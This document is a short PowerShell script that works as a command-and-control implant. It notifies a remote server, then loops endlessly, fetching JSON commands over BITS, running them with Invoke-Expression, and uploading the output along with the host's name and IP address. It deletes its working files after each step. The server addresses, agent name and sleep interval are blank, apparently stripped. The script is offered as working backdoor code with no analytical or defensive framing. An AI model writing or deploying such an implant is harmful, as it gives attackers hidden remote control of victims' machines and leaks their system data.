
$command_url = "http:///commands/.json"
$upload_url = "http:///uploads/_response.txt"
$notify_url = "http:///uploads/notify.txt"
$local_command_file = "$Env:temp\.json"
$local_result_file = "$Env:temp\_response.txt"
$local_notify_file = "$Env:temp\_notify.txt"
$agentname = ""

function Notify-Server {
    try {
        "identifier=$agentname" | Out-File -FilePath $local_notify_file -Encoding utf8
        Start-BitsTransfer -Source $local_notify_file -Destination $notify_url -TransferType Upload -ErrorAction Stop
        Remove-Item -Path $local_notify_file -Force
    } catch {
        Write-Error "Failed to notify server: $_"
    }
}

function Download-Command {
    try {
        Start-BitsTransfer -Source $command_url -Destination $local_command_file -ErrorAction Stop
    } catch {
        Write-Error "Failed to download command: $_"
        exit
    }
}

function Execute-Command {
    if (Test-Path $local_command_file) {
        $CommandData = Get-Content $local_command_file | ConvertFrom-Json
        if (-not [string]::IsNullOrWhiteSpace($CommandData.command)) {
            try {
                $ExecutionResult = Invoke-Expression $CommandData.command 2>&1
                $hostname = hostname
                $ip = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object { $_.InterfaceAlias -notlike "*Loopback*" } | Select-Object -First 1).IPAddress
                "$hostname`n$ip`n$ExecutionResult" | Out-File -FilePath $local_result_file -Encoding utf8
            } catch {
                "Error: $_" | Out-File -FilePath $local_result_file -Encoding utf8
            }
        }
    }
}

function Upload-Result {
    if (Test-Path $local_result_file) {
        try {
            Start-BitsTransfer -Source $local_result_file -Destination $upload_url -TransferType Upload -ErrorAction Stop
            Remove-Item -Path $local_result_file -Force
        } catch {
            Write-Error "Failed to upload result: $_"
            exit
        }
    } else {
        exit
    }
}

function Main {
    Notify-Server
    while ($true) {
        Download-Command
        Execute-Command
        Upload-Result
        Remove-Item $local_command_file -ErrorAction SilentlyContinue
        Start-Sleep -Seconds 
    }
}

Main
